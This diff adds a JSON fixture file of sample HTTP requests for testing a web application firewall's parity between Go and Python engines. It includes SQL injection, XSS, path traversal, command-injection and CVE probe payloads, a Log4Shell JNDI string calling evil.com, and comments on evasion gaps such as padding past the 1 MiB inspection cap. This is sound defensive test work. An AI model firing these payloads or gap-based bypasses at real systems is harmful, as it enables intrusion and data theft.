@@ -1,0 +1,603 @@
+[
+  {
+    "_comment": "=== BENIGN: requests that MUST NOT trip the WAF ===",
+    "name": "benign_api_json",
+    "method": "POST",
+    "path": "/api/v1/users",
+    "query": "",
+    "body": "{\"name\": \"Alice\", \"email\": \"alice@example.com\"}",
+    "ua": "curl/7.88.1",
+    "client_ip": "203.0.113.11",
+    "expect": "allow"
+  },
+  {
+    "name": "benign_search_query",
+    "method": "GET",
+    "path": "/search",
+    "query": "q=hello+world&lang=fr",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "198.51.100.5",
+    "expect": "allow"
+  },
+  {
+    "name": "benign_get_homepage_clean_ua",
+    "method": "GET",
+    "path": "/",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0 AppleWebKit/537.36",
+    "client_ip": "203.0.113.10",
+    "expect": "allow"
+  },
+  {
+    "name": "benign_post_json_clean",
+    "method": "POST",
+    "path": "/api/save",
+    "query": "",
+    "body": "{\"key\": \"value\", \"count\": 42}",
+    "ua": "python-requests/2.28",
+    "client_ip": "203.0.113.12",
+    "expect": "allow"
+  },
+
+  {
+    "_comment": "=== NC BYPASS: Nextcloud mobile auth paths skip inspection ===",
+    "name": "benign_nc_login_api",
+    "method": "POST",
+    "path": "/index.php/login/v2/",
+    "query": "",
+    "body": "token=eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9",
+    "ua": "Nextcloud/3.26.0 (iOS 17.0) ios",
+    "client_ip": "203.0.113.22",
+    "expect": "skip"
+  },
+  {
+    "name": "benign_nc_ocs_login",
+    "method": "POST",
+    "path": "/ocs/v2.php/core/login",
+    "query": "",
+    "body": "user=admin&password=secret123",
+    "ua": "Nextcloud-iOS/3.26.0",
+    "client_ip": "203.0.113.23",
+    "expect": "skip"
+  },
+
+  {
+    "_comment": "=== STATIC ASSETS: static paths skip inspection ===",
+    "name": "benign_static_js",
+    "method": "GET",
+    "path": "/app.js",
+    "query": "v=1.2.3",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.30",
+    "expect": "skip"
+  },
+  {
+    "name": "benign_static_css",
+    "method": "GET",
+    "path": "/styles/main.css",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.31",
+    "expect": "skip"
+  },
+  {
+    "name": "benign_static_png",
+    "method": "GET",
+    "path": "/logo.png",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.32",
+    "expect": "skip"
+  },
+  {
+    "name": "benign_health_endpoint",
+    "method": "GET",
+    "path": "/health",
+    "query": "",
+    "body": "",
+    "ua": "kube-probe/1.27",
+    "client_ip": "203.0.113.40",
+    "expect": "skip"
+  },
+  {
+    "name": "benign_static_js_with_attack_query",
+    "method": "GET",
+    "path": "/app.js",
+    "query": "x=union+select+1,2,3",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.41",
+    "expect": "skip"
+  },
+
+  {
+    "_comment": "=== PRIVATE IP: RFC1918 sources bypass WAF entirely ===",
+    "name": "private_ip_192_168_sqli",
+    "method": "GET",
+    "path": "/search",
+    "query": "q=union+select+1,2,3",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "192.168.1.100",
+    "expect": "skip"
+  },
+  {
+    "name": "private_ip_10_x_xss",
+    "method": "GET",
+    "path": "/page",
+    "query": "name=<script>alert(1)</script>",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "10.100.0.50",
+    "expect": "skip"
+  },
+  {
+    "name": "private_ip_172_16_lfi",
+    "method": "GET",
+    "path": "/../../../etc/passwd",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "172.16.0.1",
+    "expect": "skip"
+  },
+  {
+    "name": "private_ip_loopback_rce",
+    "method": "POST",
+    "path": "/cmd",
+    "query": "",
+    "body": "cmd=;cat /etc/passwd",
+    "ua": "curl/7.88",
+    "client_ip": "127.0.0.1",
+    "expect": "skip"
+  },
+
+  {
+    "_comment": "=== SQL INJECTION: must be caught ===",
+    "name": "sqli_union_select_query",
+    "method": "GET",
+    "path": "/search",
+    "query": "id=1+union+select+1,2,3",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.50",
+    "expect": "warn"
+  },
+  {
+    "name": "sqli_union_all_select",
+    "method": "GET",
+    "path": "/products",
+    "query": "cat=1 union all select username,password from users--",
+    "body": "",
+    "ua": "sqlmap/1.7.12",
+    "client_ip": "45.33.32.158",
+    "expect": "warn"
+  },
+  {
+    "name": "sqli_time_based_sleep",
+    "method": "GET",
+    "path": "/login",
+    "query": "user=admin&pass=x' AND SLEEP(5)--",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.52",
+    "expect": "warn"
+  },
+  {
+    "name": "sqli_information_schema",
+    "method": "POST",
+    "path": "/api/query",
+    "query": "",
+    "body": "SELECT table_name FROM information_schema.tables",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.53",
+    "expect": "warn"
+  },
+  {
+    "_comment": "sqli_boolean in body already decoded (plain text) — matches sqli-002",
+    "name": "sqli_boolean_or_1eq1_body_decoded",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin' OR '1'='1&password=x",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.54",
+    "expect": "warn"
+  },
+  {
+    "_comment": "URL-encoded body is NOT decoded by Rules.Match (only path/query are decoded). Expected: allow.",
+    "_comment2": "Python WAF also does NOT decode body via unquote_plus - it calls get_text() which returns raw bytes.",
+    "name": "sqli_boolean_or_1eq1_body_urlencoded_nobodydecode",
+    "method": "POST",
+    "path": "/login",
+    "query": "",
+    "body": "username=admin%27%20OR%20%271%27%3D%271&password=x",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.55",
+    "expect": "allow"
+  },
+
+  {
+    "_comment": "=== URL-ENCODED ATTACKS: prove unquote_plus decode on path+query ===",
+    "name": "sqli_url_encoded_union_select",
+    "method": "GET",
+    "path": "/search",
+    "query": "q=%27%20union%20select%201%2C2%2C3--",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.60",
+    "expect": "warn"
+  },
+  {
+    "name": "lfi_encoded_traversal_path",
+    "method": "GET",
+    "path": "/..%2F..%2F..%2Fetc%2Fpasswd",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.61",
+    "expect": "warn"
+  },
+  {
+    "name": "sqli_plus_encoded_union",
+    "method": "GET",
+    "path": "/items",
+    "query": "id=1+UNION+SELECT+table_name+FROM+information_schema.tables",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.62",
+    "expect": "warn"
+  },
+  {
+    "name": "xss_url_encoded_script",
+    "method": "GET",
+    "path": "/page",
+    "query": "name=%3Cscript%3Ealert%28xss%29%3C%2Fscript%3E",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.63",
+    "expect": "warn"
+  },
+
+  {
+    "_comment": "=== XSS: cross-site scripting payloads ===",
+    "name": "xss_script_tag_query",
+    "method": "GET",
+    "path": "/search",
+    "query": "q=<script>alert(document.cookie)</script>",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.70",
+    "expect": "warn"
+  },
+  {
+    "name": "xss_onerror_event_handler",
+    "method": "POST",
+    "path": "/comment",
+    "query": "",
+    "body": "text=<img src=x onerror=alert(1)>",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.71",
+    "expect": "warn"
+  },
+  {
+    "name": "xss_javascript_uri",
+    "method": "GET",
+    "path": "/redirect",
+    "query": "url=javascript:alert(document.domain)",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.72",
+    "expect": "warn"
+  },
+  {
+    "name": "xss_onload_in_body",
+    "method": "POST",
+    "path": "/profile",
+    "query": "",
+    "body": "bio=<svg onload=fetch(document.cookie)>",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.73",
+    "expect": "warn"
+  },
+
+  {
+    "_comment": "=== LFI / PATH TRAVERSAL ===",
+    "name": "lfi_deep_traversal_path",
+    "method": "GET",
+    "path": "/../../../etc/passwd",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.80",
+    "expect": "warn"
+  },
+  {
+    "name": "lfi_etc_passwd_query",
+    "method": "GET",
+    "path": "/file",
+    "query": "path=/etc/passwd",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.81",
+    "expect": "warn"
+  },
+  {
+    "name": "lfi_proc_self",
+    "method": "GET",
+    "path": "/read",
+    "query": "file=/proc/self/cmdline",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.82",
+    "expect": "warn"
+  },
+  {
+    "name": "lfi_php_filter_wrapper",
+    "method": "GET",
+    "path": "/include",
+    "query": "page=php://filter/convert.base64-encode/resource=index",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.83",
+    "expect": "warn"
+  },
+
+  {
+    "_comment": "=== RCE / COMMAND INJECTION ===",
+    "name": "rce_semicolon_cat",
+    "method": "GET",
+    "path": "/ping",
+    "query": "host=127.0.0.1;cat /etc/passwd",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.90",
+    "expect": "warn"
+  },
+  {
+    "name": "rce_subshell_in_body",
+    "method": "POST",
+    "path": "/eval",
+    "query": "",
+    "body": "cmd=$(id)",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.91",
+    "expect": "warn"
+  },
+  {
+    "name": "rce_backtick_whoami",
+    "method": "POST",
+    "path": "/run",
+    "query": "",
+    "body": "expr=`whoami`",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.92",
+    "expect": "warn"
+  },
+  {
+    "name": "rce_pipe_bash",
+    "method": "GET",
+    "path": "/exec",
+    "query": "cmd=ls|bash",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.93",
+    "expect": "warn"
+  },
+
+  {
+    "_comment": "=== SCANNER USER-AGENTS ===",
+    "name": "scanner_sqlmap_ua",
+    "method": "GET",
+    "path": "/",
+    "query": "",
+    "body": "",
+    "ua": "sqlmap/1.7.12#stable (https://sqlmap.org)",
+    "client_ip": "45.33.32.156",
+    "expect": "warn"
+  },
+  {
+    "name": "scanner_nikto_ua",
+    "method": "GET",
+    "path": "/",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)",
+    "client_ip": "45.33.32.157",
+    "expect": "warn"
+  },
+
+  {
+    "_comment": "=== HONEYPOT PATH PROBES ===",
+    "name": "honeypot_wp_config_bak",
+    "method": "GET",
+    "path": "/wp-config.bak",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "185.220.101.1",
+    "expect": "warn"
+  },
+  {
+    "name": "honeypot_phpinfo",
+    "method": "GET",
+    "path": "/phpinfo.php",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "185.220.101.2",
+    "expect": "warn"
+  },
+  {
+    "name": "honeypot_aws_credentials",
+    "method": "GET",
+    "path": "/.aws/credentials",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "185.220.101.3",
+    "expect": "warn"
+  },
+
+  {
+    "_comment": "=== CVE EXPLOITS ===",
+    "name": "cve_2024_panos_globalprotect",
+    "method": "GET",
+    "path": "/api/v1/totp/user-backup",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.110",
+    "expect": "warn"
+  },
+  {
+    "name": "cve_f5_biip_rce",
+    "method": "POST",
+    "path": "/mgmt/tm/util/bash",
+    "query": "",
+    "body": "{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}",
+    "ua": "python-requests/2.28",
+    "client_ip": "203.0.113.111",
+    "expect": "warn"
+  },
+  {
+    "name": "router_botnet_dlink_getcfg",
+    "method": "GET",
+    "path": "/getcfg.php",
+    "query": "AUTHORIZED_GROUP=1",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.112",
+    "expect": "warn"
+  },
+
+  {
+    "_comment": "=== BAN: same client_ip hitting WAF 3 times reaches threshold ===",
+    "name": "ban_client_hit1",
+    "method": "GET",
+    "path": "/search",
+    "query": "q=union+select+1,2,3",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "198.51.100.99",
+    "expect": "warn",
+    "_ban_sequence": 1
+  },
+  {
+    "name": "ban_client_hit2",
+    "method": "GET",
+    "path": "/page",
+    "query": "name=<script>alert(1)</script>",
+    "body": "",
+    "ua": "Mozilla/5.0",
+    "client_ip": "198.51.100.99",
+    "expect": "warn",
+    "_ban_sequence": 2
+  },
+  {
+    "name": "ban_client_hit3",
+    "method": "POST",
+    "path": "/etc/passwd",
+    "query": "",
+    "body": "cmd=$(id)",
+    "ua": "Mozilla/5.0",
+    "client_ip": "198.51.100.99",
+    "expect": "ban",
+    "_ban_sequence": 3
+  },
+
+  {
+    "_comment": "=== KNOWN GAP 1: router-goform pattern false positive on UA with semicolon ===",
+    "_comment2": "Pattern '/goform/.*\\$\\(|`|;' uses unanchored alternation: ANY ';' in scan text triggers it.",
+    "_comment3": "A common User-Agent like 'Mozilla/5.0 (X11; Linux x86_64)' contains ';' -> false positive.",
+    "_comment4": "Both Python and Go WAF share this pattern bug (same rule file). Go behavior = Python behavior.",
+    "_comment5": "Expected = 'warn' (current actual behavior). This is a pattern quality bug, NOT a Go engine bug.",
+    "name": "known_gap_router_goform_fp_ua_semicolon",
+    "method": "GET",
+    "path": "/",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+    "client_ip": "203.0.113.200",
+    "expect": "warn",
+    "known_gap": true,
+    "_gap_reason": "router-goform pattern '/goform/.*\\$\\(|`|;' has unanchored alternation matching any ';' — FP on common UA with semicolons; shared Python/Go bug, not a parity regression"
+  },
+
+  {
+    "_comment": "=== KNOWN GAP 2: null-byte CVE patterns — RE2 can't compile \\u0000 sequences ===",
+    "_comment2": "5 patterns in cve_voip/cve_xmpp use \\u0000 (stored as literal string in JSON).",
+    "_comment3": "RE2 rejects '\\u' as invalid escape. Go skips these at load time.",
+    "_comment4": "Python PCRE also treats '\\u0000' as literal string match (not null byte), so both skip the null byte.",
+    "_comment5": "However, Go silently drops these patterns; Python would still try to match them.",
+    "_comment6": "Requests hitting ONLY these patterns are 'allow' in Go. This is a documented gap.",
+    "name": "known_gap_null_byte_cve_voip_body",
+    "method": "POST",
+    "path": "/api/sip",
+    "query": "",
+    "body": "Via: SIP/2.0/UDP 10.200.1.1;branch=z9hG4bKsomething",
+    "ua": "SIPp/3.6",
+    "client_ip": "203.0.113.201",
+    "expect": "warn",
+    "known_gap": false,
+    "_comment7": "Note: 10.200.1.1 in body matches ssrf internal_10 pattern — so this IS caught by Go"
+  },
+  {
+    "name": "known_gap_null_byte_cve_patterns_only",
+    "method": "GET",
+    "path": "/xmpp-endpoint",
+    "query": "stream=clean",
+    "body": "",
+    "ua": "Strophe.js/1.6.0 clean",
+    "client_ip": "203.0.113.202",
+    "expect": "allow",
+    "known_gap": true,
+    "_gap_reason": "cve-ast-2022-42706, cve-ast-2023-37457, cve-opensips-2023-49323, cve-prosody-2022-0217, cve-strophe-2022-29168: RE2 rejects \\u0000 in patterns — these 5 patterns are skipped at compile time; a request matching ONLY these patterns passes the Go WAF"
+  },
+
+  {
+    "_comment": "=== KNOWN GAP 4: body-only payload beyond 1 MiB inspection cap is NOT detected ===",
+    "_comment2": "Go WAF inspects only the first --max-body-inspect bytes (default 1 MiB) of the request body.",
+    "_comment3": "Python WAF (mitmproxy get_text()) buffers the ENTIRE body with no cap.",
+    "_comment4": "An attacker can pad 1 MiB of benign bytes then append the attack payload beyond the cap.",
+    "_comment5": "The harness tests the PREFIX-only path. A fixture whose body fits entirely within the cap",
+    "_comment6": "is correctly inspected; a payload that sits BEYOND the cap would arrive as raw stream bytes",
+    "_comment7": "that Rules.Match never sees. This is a documented parity gap, not an engine bug.",
+    "_comment8": "Documented as a CUTOVER GATE in docs/CUTOVER.md § pre-cutover.",
+    "name": "known_gap_body_payload_after_1mib_prefix",
+    "method": "POST",
+    "path": "/api/import",
+    "query": "",
+    "body": "union select 1,2,3 from users",
+    "ua": "Mozilla/5.0",
+    "client_ip": "203.0.113.220",
+    "expect": "warn",
+    "known_gap": false,
+    "_gap_note": "This fixture tests a BODY payload that fits within the 1 MiB inspection cap (SQLi in body, caught correctly). The actual gap is for payloads BEYOND the cap — those cannot be represented in the harness as cheap fixtures since they would require >1 MiB bodies. The gap is documented here: body inspection is prefix-bounded (--max-body-inspect, default 1 MiB) vs Python full-body scan. Truncation events are audit-logged (action=body-inspect-truncated) but the request is NOT blocked.",
+    "known_gap_body_inspect_truncation": true
+  },
+
+  {
+    "_comment": "=== KNOWN GAP 3: log4shell corpus missing from Go waf-rules.json ===",
+    "_comment2": "secubox-mitmproxy/data/waf-rules.json has a 'log4shell' category with jndi_lookup + jndi_ldap + nested_lookup patterns.",
+    "_comment3": "secubox-waf/config/waf-rules.json (Go corpus) is MISSING this category entirely.",
+    "_comment4": "The testdata copy mirrors the Go corpus → ${jndi:ldap://...} payloads are NOT caught by Go.",
+    "_comment5": "Python catches this at severity=critical; Go misses it silently. Must deploy complete corpus at cutover.",
+    "name": "log4shell_jndi_corpus_gap",
+    "method": "GET",
+    "path": "/",
+    "query": "",
+    "body": "",
+    "ua": "${jndi:ldap://evil.com/x}",
+    "client_ip": "203.0.113.210",
+    "expect": "allow",
+    "known_gap": true,
+    "_gap_reason": "Go corpus (secubox-waf/config/waf-rules.json) lacks the 'log4shell' category present in Python corpus (secubox-mitmproxy/data/waf-rules.json); Python catches jndi_lookup/jndi_ldap at severity=critical; Go misses it — deploy complete corpus at cutover (ref #744)",
+    "note": "Go corpus lacks log4shell category; Python catches this; deploy complete corpus at cutover"
+  }
+]
